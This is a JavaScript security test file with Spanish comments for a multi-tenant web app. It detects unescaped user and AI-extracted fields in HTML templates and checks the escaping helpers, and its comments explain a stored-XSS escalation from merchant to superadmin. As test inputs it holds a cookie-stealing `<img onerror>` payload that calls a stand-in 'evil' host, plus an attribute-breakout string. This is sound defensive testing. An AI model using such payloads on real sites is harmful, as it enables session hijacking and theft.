/* Datos de usuario pintados dentro de HTML sin escapar (XSS almacenado).

   Lo que lo hace grave acá y no en cualquier app: la CSP permite
   `script-src 'unsafe-inline'` (el menú y los botones usan onclick en línea),
   así que un `<img src=x onerror=...>` guardado en un campo SÍ se ejecuta.

   EL CASO REAL que destapó esto: el Panel SaaS pintaba sin escapar el nombre
   del comercio, el banco y la referencia que la IA LEE DE LA IMAGEN del
   voucher que sube el cliente. Cualquier comercio podía subir un voucher con
   HTML dentro y ejecutarlo en la sesión del SUPERADMIN — la que ve a todos los
   comercios y puede llamar a tenant-db-tools, que borra un taller entero.
   No era un XSS "de su propio tenant": era escalada entre comercios.

   Esta prueba no revisa un archivo: revisa la REGLA en todo js/, para que el
   próximo campo que alguien interpole quede en rojo acá y no en producción. */
const fs = require('fs');
const path = require('path');

const raiz = path.join(__dirname, '..');

/* Campos que los escribe gente de afuera (clientes, empleados, quien se
   registra) o que produce la IA leyendo un documento subido. */
const CAMPOS = /\.(nombre|nombre_completo|direccion|notas|observaciones|descripcion|comentario|razon_social|referencia|apellido|profesion|titulo|motivo|detalle|marca|modelo|email)\b/;
/* Ya neutralizan el valor o lo convierten en número/fecha. */
/* jsAttr() cubre el caso de una cadena JS dentro de un atributo (onclick), que
   es MÁS estricto que esc(): escapa además la barra invertida y la comilla. */
/* escRaya() (armeria-declaraciones.js) envuelve UI.esc: o pinta el valor
   escapado o una raya para llenar a mano. Va nombrado con "esc" justamente
   para que se lo pueda reconocer acá. */
const SEGURO = /esc\(|escRaya\(|jsAttr\(|UI\.q\(|UI\.fecha\(|Number\(|parseInt|parseFloat|toFixed|\.length\b|JSON\.stringify|encodeURI/;
/* La expresión arma etiquetas a propósito (no es un dato suelto). */
const PRODUCE_HTML = /<[a-z]/i;
const TAG = /<(div|span|td|tr|li|p|h[1-6]|option|button|b|strong|a|img|label|small|input)\b/i;

function archivosJS(dir, acc = []) {
  for (const f of fs.readdirSync(dir, { withFileTypes: true })) {
    if (f.name === 'node_modules' || f.name.startsWith('.')) continue;
    const p = path.join(dir, f.name);
    if (f.isDirectory()) archivosJS(p, acc);
    else if (f.name.endsWith('.js')) acc.push(p);
  }
  return acc;
}

/* NO se intenta delimitar la plantilla completa.
   La primera versión de esta prueba buscaba plantillas enteras con
   /`(?:[^`\\]|\\[\s\S])*`/ y luego miraba sus interpolaciones. Eso falla con
   plantillas ANIDADAS —muy comunes acá: `<div>${cond ? `<b>x</b>` : ''}</div>`—
   porque la expresión corta en el primer backtick interno y parte la plantilla
   en pedazos que ya no contienen ninguna etiqueta. Así se le escapó
   `${p.nombre}` en la tarjeta de producto del POS, con la prueba en verde.

   En vez de eso se recorren TODAS las interpolaciones del archivo y se mira el
   texto inmediatamente anterior: si ahí hay una etiqueta abierta, ese valor se
   está pintando dentro de HTML, sin importar cuántas plantillas haya de por
   medio. */
const VENTANA = 260;

function sinEscapar() {
  const hallazgos = [];
  for (const f of archivosJS(path.join(raiz, 'js'))) {
    const src = fs.readFileSync(f, 'utf8');
    const re = /\$\{(?:[^{}]|\{[^{}]*\})*\}/g;
    let m;
    while ((m = re.exec(src)) !== null) {
      const e = m[0];
      if (!CAMPOS.test(e) || SEGURO.test(e) || PRODUCE_HTML.test(e)) continue;
      const antes = src.slice(Math.max(0, m.index - VENTANA), m.index);
      if (!TAG.test(antes)) continue;                     // no se está pintando HTML
      hallazgos.push({
        archivo: path.relative(raiz, f),
        linea: src.slice(0, m.index).split('\n').length,
        expr: e.replace(/\s+/g, ' ').slice(0, 70),
      });
    }
  }
  return hallazgos;
}

let pasadas = 0, fallidas = 0;
const ok = (n, c) => { if (c) { pasadas++; console.log('PASS — ' + n); } else { fallidas++; console.log('FAIL — ' + n); } };

/* ── La regla ───────────────────────────────────────────────────────────── */
{
  const h = sinEscapar();
  ok(`ningún campo de usuario se pinta sin escapar (encontrados: ${h.length})`, h.length === 0);
  h.slice(0, 25).forEach(x => console.log(`        ↳ ${x.archivo}:${x.linea}  ${x.expr}`));
  if (h.length > 25) console.log(`        ↳ ...y ${h.length - 25} más`);
}

/* ── El escapador hace su trabajo ───────────────────────────────────────── */
{
  const ui = fs.readFileSync(path.join(raiz, 'js', 'core', 'ui.js'), 'utf8');
  const m = ui.match(/esc\(valor=''\)\s*\{[\s\S]*?\n  \}/);
  ok('existe UI.esc', !!m);

  /* Se evalúa la función real, no una copia: si alguien le quita un replace,
     esta prueba lo ve. */
  const esc = new Function('return function ' + m[0])();
  ok('escapa <', esc('<b>').indexOf('<') === -1);
  ok('escapa >', esc('<b>').indexOf('>') === -1);
  ok('escapa comillas dobles', esc('"x"').indexOf('"') === -1);
  ok('escapa comillas simples (atributos con \')', esc("'x'").indexOf("'") === -1);
  ok('escapa & (si no, &lt; se puede reconstruir)', esc('&').includes('&amp;'));
  ok('null no revienta ni imprime "null"', esc(null) === '');
  ok('undefined tampoco', esc(undefined) === '');
  ok('los números pasan intactos', esc(1500.5) === '1500.5');

  /* El ataque concreto del Panel SaaS. */
  const payload = '<img src=x onerror="fetch(\'//evil/\'+document.cookie)">';
  const salida = esc(payload);
  ok('un voucher con <img onerror> queda inerte',
     !/<img/i.test(salida) && !salida.includes('onerror="'));
}

/* ── UI.jsAttr: cadena JS DENTRO de un atributo ─────────────────────────────
   El caso real: onclick="Modulos.eliminarRegistro('t','id','NOMBRE')".
   Ahí esc() NO alcanza — el navegador decodifica las entidades del atributo
   ANTES de evaluar el JS, así que un &#39; vuelve a ser ' y rompe la cadena.
   Once módulos escapaban a mano sólo la comilla simple, dejando pasar la
   DOBLE, que cierra el atributo y permite colgarle otro manejador al botón. */
{
  const ui = fs.readFileSync(path.join(raiz, 'js', 'core', 'ui.js'), 'utf8');
  const mEsc = ui.match(/esc\(valor=''\)\s*\{[\s\S]*?\n  \}/);
  const mAttr = ui.match(/jsAttr\(valor = ''\)\s*\{[\s\S]*?\n  \}/);
  ok('existe UI.jsAttr', !!mAttr);

  /* Se evalúan las funciones REALES, con esc como dependencia de jsAttr. */
  const obj = new Function(`return { ${mEsc[0]}, ${mAttr[0]} }`)();
  const jsAttr = v => obj.jsAttr(v);

  ok('escapa la comilla simple para que no cierre la cadena JS',
     !/(^|[^\\])'/.test(jsAttr("Ferretería 'El Sol'")));
  ok('escapa la barra invertida ANTES que las comillas',
     jsAttr('a\\b') === 'a\\\\b');
  ok('la comilla DOBLE no puede cerrar el atributo',
     !jsAttr('Taller "El Rápido"').includes('"'));
  ok('el < queda neutralizado', !jsAttr('<script>').includes('<'));
  ok('los saltos de línea no parten la sentencia',
     !/[\r\n]/.test(jsAttr('linea1\nlinea2')));
  ok('un nombre normal se lee igual', jsAttr('Repuestos Torres') === 'Repuestos Torres');
  ok('null y undefined no imprimen basura', jsAttr(null) === '' && jsAttr(undefined) === '');

  /* Lo que rompía: cerrar el atributo y colgar otro manejador. El texto
     "onmouseover=" puede seguir apareciendo —como texto inerte—; lo que no
     puede quedar es la comilla que cierra el atributo. */
  const ataque = 'x" onmouseover="robar()';
  ok('no se puede cerrar el onclick para inyectar otro manejador',
     !jsAttr(ataque).includes('"') && jsAttr(ataque).includes('&quot;'));

  /* Y que nadie vuelva al escape a mano. Se excluye ui.js, que ES la
     implementación: ahí el .replace tiene que estar. */
  const aMano = archivosJS(path.join(raiz, 'js'))
    .filter(f => !f.endsWith(path.join('core', 'ui.js')))
    .filter(f => /\.replace\(\/'\/g,\s*"\\\\'"\)/.test(fs.readFileSync(f, 'utf8')));
  ok(`nadie escapa la comilla a mano (quedan: ${aMano.length})`, aMano.length === 0);
  aMano.forEach(f => console.log('        ↳ ' + path.relative(raiz, f)));
}

/* ── El Panel SaaS en concreto ──────────────────────────────────────────── */
{
  const sa = fs.readFileSync(path.join(raiz, 'js', 'modulos', 'admin', 'superadmin.js'), 'utf8');
  ok('el nombre del comercio se escapa en la tabla de vouchers',
     /UI\.esc\(t\?\.name\|\|t\?\.slug/.test(sa));
  ok('la referencia leída por la IA se escapa',
     /UI\.esc\(v\.referencia_detectada/.test(sa));
  ok('el banco se escapa', /UI\.esc\(v\.banco/.test(sa));
  /* Los checks se unen con <br> nuestro, pero cada uno va escapado. */
  ok('los checks de la IA se escapan uno por uno antes de unirlos',
     /checks\|\|\[\]\)\.map\(c=>UI\.esc\(c\)\)\.join\('<br>'\)/.test(sa));
}

console.log(`   ${pasadas} pasadas, ${fallidas} fallidas`);
if (fallidas) process.exitCode = 1;
